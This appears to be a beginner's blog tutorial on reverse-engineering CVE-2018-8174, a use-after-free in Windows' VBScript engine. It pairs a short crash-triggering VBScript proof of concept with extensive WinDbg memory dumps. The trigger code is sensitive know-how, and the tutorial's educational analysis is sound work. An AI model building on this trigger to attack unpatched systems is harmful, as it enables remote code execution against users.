title: A Beginner's Guide to Understanding Windows VBScript Engine Remote Code Execution Vulnerability (CVE-2018-8174)
date: 2018-09-09
---

# Introduction
CVE-2018-8174 is a VBScript vulnerability which was found being exploited in the wild. The unique event related to this vulnerability is, though it is a VBScript vulnerability, it was found being exploited using MS Office. There is a blogpost by Qihoo 360 [1] performing a thorough analysis on Exploit Delivery, Vulnerability Root Cause, Exploitation Strategy, Payload etc. There is also a good blogpost from Kaspersky [2] where they have done a deeper analysis of the vulnerability. This post will focus on various techniques of reverse engineering internals of Windows VBScript Engine, to understand the vulnerability better.

**Disclaimer:** This post is meant to help beginner's to take a deep dive analyzing memory corruption vulnerabilities in VBScript engine. If you are an experienced analyst most of the information discussed here is probably already known to you.

***

# Prerequisites
The first requirement is to set-up a vulnerable VM. You can uninstall the May patch from an up to date installation of Windows and you should be good to go. In my analysis, I have specifically used Windows 7 SP1 32-bit. Generally, vulnerabilities related to VBScript Engine are analyzed using IE. But, we will use `wscript.exe` to analyze this vulnerability, as it is much easier to handle for debugging purposes and we don't have to deal with IE cache issues. Also, I have used `Windbg` for debugging and `IDA Freeware for Windows` for disassembly. Using any other debugger, such as `Immunity Debugger`, `OllyDbg`, `x64dbg` will also work. Also you can use any other disassenmbler such as `radare 2`, `Hopper`, `Binary Ninja` etc.

# First look at the crash
First we will start with a minimal POC for triggerring the vulnerability

```
Dim ArrA(1)
Dim ArrB(1)

Class ClassVuln
    Private Sub Class_Terminate()
        Set ArrB(0) = ArrA(0)
        ArrA(0) = 31337
    End Sub
End Class

Sub TriggerVuln
    Set ArrA(0) = New ClassVuln
    Erase ArrA
    Erase ArrB
End Sub

TriggerVuln
```

Let's grab the POC code from 0patch blog [3] which is another good source of analysis for this vulnerability. We will save the above code in a file named `poc.vbs`. At first you can see that we have declared two VBScript arrays, `ArrA` and `ArrB`, each of size 1. Next we declared a class named `ClassVuln` inside which we wrote a function named `Class_Terminate`. This is a special function which will be called just before the destruction of a VBScript object. `Class_Terminate` is a deprecated and undocumented functionality in VBScript, but code corresponding to its implementation is not yet removed, so it can still be invoked. Inside `TriggerVuln` function we are setting the first element of `ArrA` to an object of type `ClassVuln`, then we are erasing `ArrA` and `ArrB`.

Now, let's take a look what is happenning inside `Class_Terminate` function. Inside `Class_Terminate` 1st element of `ArrB` is being assigned the value of 1st element of `ArrA`, then in the next line the 1st element of `ArrA` is assigned the value of 31337. Don't worry if this does not make any sense now, we will explore the basic concepts needed to understand the above code one by one.

## Using GFLAGS for Heap Instrumentation
Before executing `poc.vbs`, we will turn on Page Heap and User stack trace database for `WScript.exe` using the following command from an administrator command-prompt
> gflags.exe /i wscript.exe +hpa +ust

Now, we will launch `wscript.exe` under Windbg using the following command:
> windbg.exe wscript.exe poc.vbs

The debugger will catch a crash as follows:

```c++
(49c.6d0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=017e8fc0 ebx=00000020 ecx=00000009 edx=00000000 esi=03496fe0 edi=00000009
eip=75e649fa esp=0042e8d8 ebp=0042e8e0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206

75e649fa 8b08            mov     ecx,dword ptr [eax]  ds:0023:017e8fc0=????????
```

Let's dump the call stack using `kb` command:

```c++
 # ChildEBP RetAddr  Args to Child              
00 002eec00 77710130 03384fe0 03384fe0 0329cfe8 OLEAUT32!VariantClear+0xb3

03 002eec4c 77725b5b 0329cfe8 00732e88 0329cfe8 OLEAUT32!SafeArrayDestroyData+0xf
04 002eec60 6afe3d40 0329cfe8 59f523ba 002eecb4 OLEAUT32!Thunk_SafeArrayDestroyData+0x39

06 002eecbc 6af8666b 002eedb8 00000001 0072cf80 vbscript!StaticEntryPoint::Call+0x2f
...
```

We can see that the crash occurred in `OLEAUT32!VariantClear`. By observing the function calls involved in the call stack more closely, we can assume that the crash happened while destroying some array from memory. So, let's issue another command in Windbg to gather some information about the invalid memory address being referenced

```c++
0:000> !heap -p -a @eax
    address 017e8fc0 found in
    _DPH_HEAP_ROOT @ 1721000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                    17224ac:          17e8000             2000

    6c8c58f7 vbscript!StaticEntryPoint::Call+0x0000002f
    ...
   ```

From the above stack trace it is very much evident that the crash happened because `poc.vbs` was trying to access a freed memory. Also, we can see that the freed memory belonged to a VBScript class previously.

***

# Understanding VBScript Array Allocation/Deallocation
First we have to do some analysis to find out how Arrays in VBScript are created and destroyed. We will write a small snippet of VBScript and analyze it with WinDbg

```VBScript
MsgBox "before Dim"
Dim ArrA(&h1000000)
MsgBox "After Dim, Before loop"
ArrA(0) = &h41414141
MsgBox ArrA(0)
```

Save the above code snippet in a file named `1.vbs`. In the above script we are declaring a VBScript Array of size `0x1000000` and then we are assigning a value of `0x41414141` to the first element of the array. Our intention is to find out the address and layout of VBScript array in memory. Generally, heap memory allocations in Windows are done using `ntdll!RtlAllocateHeap` API. We can directly insert a breakpoint at it, but then the breakpoint will hit too many times. In order to avoid that we can open `ole32.dll` in IDA and identify that `CRetailMalloc_Alloc()` is a wrapper over `RtlAllocateHeap()` and is responsible to call it. `CRetailMalloc_Alloc()` accepts 2 parameters, out of which the 2nd parameter represents size of the requested heap chunk. Now, going back to `1.vbs`, at line 2 we are creating an array of size 0x1000000. We should look for this number or a value slightly bigger than this number being passed to the 2nd parameter of `CRetailMalloc_Alloc()`.

First we will wait for the first `MsgBox` to display the message *before Dim*, next we will break inside the debugger and insert a breakpoint at `ole32!CRetailMalloc_Alloc`, then we will continue execution. In my case, on hitting the breakpoint second time I found the value `0x10000010` being passed to the 2nd parameter. If we dump call stack at this point, we will see the following:

```c++
 # ChildEBP RetAddr  Args to Child              
00 0019ec30 7711ddbb 75bf66bc 10000010 00000000 ole32!CRetailMalloc_Alloc [d:\w7rtm\com\ole32\com\class\memapi.cxx @ 637]
01 0019ec48 7711e2f1 75bf66bc 00000001 00000001 OLEAUT32!SafeArrayAllocData+0x39
02 0019ec60 6d8c3dc4 03400fe8 00000010 00190800 OLEAUT32!SafeArrayCreate+0x89
03 0019ee80 6d8c3e35 0019f118 00000000 0173be00 vbscript!MakeArray+0x68
...
```
By observing the call stack we can be sure that this allocation is indeed related to allocation of `ArrA`. `OLEAUT32!SafeArrayCreate()` is infact a documented API in [MSDN](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221234(v=vs.85).aspx)

```c++
SAFEARRAY* SafeArrayCreate(
  _In_ VARTYPE        vt,
  _In_ UINT           cDims,
  _In_ SAFEARRAYBOUND *rgsabound
);
```
> * vt - VARTYPE of each element of the array
> * cDims - The no. of dimensions in the array
> * rgsabound - A vector for bounds (one for each dimension) to allocate for the array

`OLEAUT32!SafeArrayCreate` returns address of **SAFEARRAY**. Hence, if we can get the address returned by `SafeArrayCreate()`, we will be able to dump the contents of the newly allocated array. So, we will restart our debugging session, wait for the first `MsgBox` to pop-up, break into the debugger and insert a breakpoint at `OLEAUT32!SafeArrayCreate` and continue our execution. As soon as we will click OK on the `MsgBox`, our breakpoint will be hit. Now, we can issue `gu` or press `Shift+F12` to complete the execution of `SafeArrayCreate()` and pass control to its caller. The debugger should again break at `vbscript!MakeArray+0x68`, and the register `EAX` will contain the address of the newly allocated **SAFEARRAY**. 


```c++
0:000> dt ole32!SAFEARRAY @eax
 +0x000 cDims            : 1
 +0x002 fFeatures        : 0x880
 +0x004 cbElements       : 0x10
 +0x008 cLocks           : 0
 +0x00c pvData           : 0x04de0ff0 Void
 +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
```

* `cDims` contains the value 1, and shows that our array is 1-dimensional
* The value of `fFeatures` can be interpreted as follows:
  * `FADF_HAVE_VARTYPE` (0x0080) - The array has a variant type
  * `FADF_VARIANT` (0x0800) - An array of VARIANTs
* `cbElements` contains the value 0x10, even though we tried to create an array of 0x1000000 elements. I am not sure why is it so, but may be its an optimization, because we are assigning value just to the first element of the array and rest of the elements are unused.

As we already know that the array is of type `VARIANT`, we can try to dump the contents of the array as follows.
```c++
0:000> dt ole32!tagVARIANT 0x04de0ff0
   +0x000 vt               : 0
   +0x002 wReserved1       : 0
   +0x004 wReserved2       : 0
   +0x006 wReserved3       : 0
   +0x008 llVal            : 0n0
   +0x008 lVal             : 0n0
   ```
We can see that even though `ArrA` has been allocated its values are not yet populated. The actual value will be at `tagVARIANT+8`. We will insert a breakpoint using `baw4 0x5030ff0 + 8`, which means the breakpoint will be hit whenever there is an attempt to write 4 bytes at the given address. Now, we will continue our execution and the second `MsgBox` will be shown. As soon as we click on OK, the breakpoint will hit, and execution will break inside `vbscript!AssignVar`. We can conclude that `vbscript!AssignVar()` assigns the value passed by the user to the array.
```c++
0:000> dt ole32!SAFEARRAY 02786fe8
   +0x000 cDims            : 1
   +0x002 fFeatures        : 0x892
   +0x004 cbElements       : 0x10
   +0x008 cLocks           : 0
   +0x00c pvData           : 0x04de0ff0 Void
   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
```

The above output shows the state of the array after `AssignVar()` returns. Notice the change in `fFeatures`, now the array is also marked as 
* `FADF_STATIC (0x0002)` - The array is statically allocated
* `FADF_FIXED_SIZE (0x0010)` - The array cannot be resized or reallocated

The contents of the array can be dumped as below:

```c++
0:000> dt ole32!tagVARIANT 0x04de0ff0
   +0x000 vt               : 3
   ...
   +0x008 lVal             : 0n1094795585
   ...
   +0x008 ulVal            : 0x41414141
   ...
```

We can observe that the element of `ArrA` has been populated now, and exactly matches the value passed in line 4 of `1.vbs`. The value of `vt` above is 3 which corresponds to the type `vbLong` (Long integer).

# Dissecting the vulnerability

Now, lets add few `MsgBox` to `poc.vbs` and save the file as `pocmsg.vbs`. The content of `pocmsg.vbs` is as follows:

```
Dim ArrA(1)
MsgBox "Creating ArrB now..."
Dim ArrB(1)

Class ClassVuln
    Private Sub Class_Terminate()
        Msg "Setting ArrB(0) to Arr(0)..."
        Set ArrB(0) = ArrA(0)
        ArrA(0) = 31337
    End Sub
End Class

Sub TriggerVuln
    MsgBox "Setting ArrA(0) to ClassVuln object ..."
    Set ArrA(0) = New ClassVuln
    MsgBox "Erasing ArrA now"
    Erase ArrA
    MsgBox "Erasing ArrB now"
    Erase ArrB
    MsgBox "ArrB Erased!"
End Sub

TriggerVuln
```

We will execute the `poc_msg.vbs` under debugger, on the intial break we will issue the following command and resume execution
> sxe ld vbscript
```c++
0:000> g
ModLoad: 6d7f0000 6d862000   C:\Windows\system32\vbscript.dll
eax=00ac0000 ebx=00000000 ecx=00241000 edx=00000000 esi=7ffdf000 edi=0023dc98
eip=771d70b4 esp=0023dbb0 ebp=0023dc04 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!KiFastSystemCallRet:
771d70b4 c3              ret
```

As shown above, the debugger will break as soon as `vbscript.dll` is loaded in process memory. Now we will set a breakpoint on  `SafeArrayCreate` and resume execution again
> bp OLEAUT32!SafeArrayCreate

The above breakpoint will hit, now we will issue `gu` command, which will complete the execution of `SafeArrayCreate` and break again. The value of `EAX` now points to ArrA. In our case, the address of `ArrA` is `0x00752fe8`

```c++
0:000> dt ole32!SAFEARRAY 00752fe8
   +0x000 cDims            : 1
   +0x002 fFeatures        : 0x880
   +0x004 cbElements       : 0x10
   +0x008 cLocks           : 0
   +0x00c pvData           : 0x03142fe0 Void
   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
0:000> dd 0x3142fe0
03142fe0  00000000 00000000 00000000 00000000
03142ff0  00000000 00000000 00000000 00000000
03143000  ???????? ???????? ???????? ????????
...
```
The above dump shows that the address of `ArrA->pvData` is `0x03142fe0` and it is initialized to all zeros. Now if we continue execution, we will see our first `MsgBox` showing the message `Creating ArrB now ...`. Our next target is to determine the address of `ArrB`. The breakpoint on `OLEAUT32!SafeArrayCreate` is already set, so as soon as we click on OK, the breakpoint will hit again.
```c++
0:000> dt ole32!SAFEARRAY 0369efe8
   +0x000 cDims            : 1
   +0x002 fFeatures        : 0x880
   +0x004 cbElements       : 0x10
   +0x008 cLocks           : 0
   +0x00c pvData           : 0x02bb4fe0 Void
   +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
0:000> dd 0x02bb4fe0
02bb4fe0  00000000 00000000 00000000 00000000
02bb4ff0  00000000 00000000 00000000 00000000
02bb5000  ???????? ???????? ???????? ????????
...
```

Similar to `ArrA`, we will obtain the addresses related to `ArrB`. The address of `ArrB` is `0x0369efe8` and the address of `ArrB->pvData` is `0x02bb4fe0`. We will resume the execution again. This time we will see our second `MsgBox` popping on screen with the message `Setting ArrA(0) to ClassVuln object...`, we will click OK to resume execution. Now we will see the next `MsgBox` bearing the message `Erasing ArrA now...`, which means the allocation of `ArrA` and `ArrB` is complete now and the fields of `pvData` should be populated now.

* dumping `ArrA->pvData`
```c++
dt ole32!tagVARIANT 0x03142fe0
   +0x000 vt               : 9
   ...
   +0x008 byref            : 0x0092afd0 Void
   ...
```
We can observe that the field `vt` (VarType) is 9, which correponds to `vbObject` and the address of this object is `0x0092afd0`.

```c++
0:003> !heap -p -a 0x0092afd0
    address 0092afd0 found in
    _DPH_HEAP_ROOT @ 851000
    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)

    ...
```
The output of above command shows that `vbscript!VBScriptClass::Create` is responsible for its allocation, and so its clear that this infact it is the address of an object of type `VulnClass`. Also the output below confirms it.

```c++
0:003> dps 0x0092afd0
0092afd0  6d7f13ec vbscript!VBScriptClass::`vftable'
0092afd4  00000001
0092afd8  0092ef78
0092afdc  0089df88
0092afe0  0000081c
0092afe4  00000000
0092afe8  00000000
0092afec  00932efc
0092aff0  00000000
0092aff4  0379efe4    <---------
0092aff8  00000000
0092affc  00000000
...

0:003> db 379efe4
0379efe4  43 00 6c 00 61 00 73 00-73 00 56 00 75 00 6c 00  C.l.a.s.s.V.u.l.
0379eff4   6e 00 00 00 c0 c0 c0 c0 -c0 c0 c0 c0  ??  ?? ??  ??  n...........????
...
```

So, at this point we have all the pieces of the puzzle, as follows:
Element | Address
---------|-----------
ArrA | 0x00752fe8
ArrA->pvData | 0x03142fe0
ArrB | 0x0369efe8
ArrB->pvData | 0x02bb4fe0
VulnClass Object | 0x0092afd0


Now, lets continue execution and click OK on the `MsgBox`, we will see the next `MsgBox` will show the message `Setting ArrB(0) to Arr(0)`. This means we are inside function `Class_Terminate()`, let's try to reason why this function is called on `Erase ArrA`. If we take a look at the MSDN documentation for `Erase`, it says that it is equivalent to assigning `Nothing` to each array variable. So, `Erase` should ideally set `ArrA(0) = Nothing`, this will make the reference count of `VulnClass` 0, and the process of freeing the memory occupied by object of `VulnClass` will start. But, if we dump `ArrA` again, we will see that `ArrA->pvData` still points to `VulnClass` and memory occupied by `VulnClass` is not yet freed. The reason behind it is that `Class_Terminate()` is called before the destruction of object, so the memory associated with it is still valid. We will resume the execution again and click OK on the `MsgBox`. This time we will see the next `MsgBox` showing the message `Erasing ArrB now`.


```c++
0:004> dd 0x02f78fe0
02f78fe0  00000000 00000000 00000000 00000000
02f78ff0  00000000 00000000 00000000 00000000
```

As seen above, the contents of `ArrA->pvData` is reset to 0. But, what about `ArrB->pvData` ? If you remember, inside `Class_Terminate()` there was a statement `ArrB(0) = ArrA(0)`, which is equivalent to `ArrB->pvData = ArrA->pvData`. Lets dump `ArrB->pvData`


```c++
dt ole32!tagVARIANT 0x027c3fe0
   +0x000 vt               : 9
   ...
   +0x008 byref            : 0x0078afd0 Void
```

We can see that `VarType` of `ArrB(0)` is now set to `vbObject` and it is pointing to `VulnClass` 

Now, lets recheck the memory occupied by `VulnClass`:

```c++
0:004> dd 0x0078afd0
0078afd0  ???????? ???????? ???????? ????????
0078afe0  ???????? ???????? ???????? ????????
...
```

We can see that the memory occupied by `VulnClass` is already freed and `ArrB->pvData` is now pointing to freed memory.

```c++
0:004> !heap -p -a 0x0078afd0
    address 0078afd0 found in
    _DPH_HEAP_ROOT @ 6b1000
    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
                                     6b230c:           78a000             2000

    6b71a509 vbscript!VbsErase+0x00000050
    ...
  ```
  
The above output shows that the free operation was triggerred by `vbscript!VbErase` which in turn was called due to the statement `Erase ArrA`. Now, the next statement to be executed is `Erase B`, which will again trigger freeing of memory chunk pointed by `0x0078afd0`. If we continue execution and click on OK, we will see the final crash as follows:

```c++
0:004> g

First chance exceptions are reported before any exception handling.
This exception may be expected and handled.

77104971 8b08            mov     ecx,dword ptr [eax]  ds:0023:0078afd0=????????
```

Now we can recognize that the crashing address belonged to `VulnClass` earlier, if we analyze disassembly around the crashing instruction, we will see that the crash happens because the code was dereferencing `0x0078afd0` in order to load its **Virtual Pointer Table** to the register `ECX`.
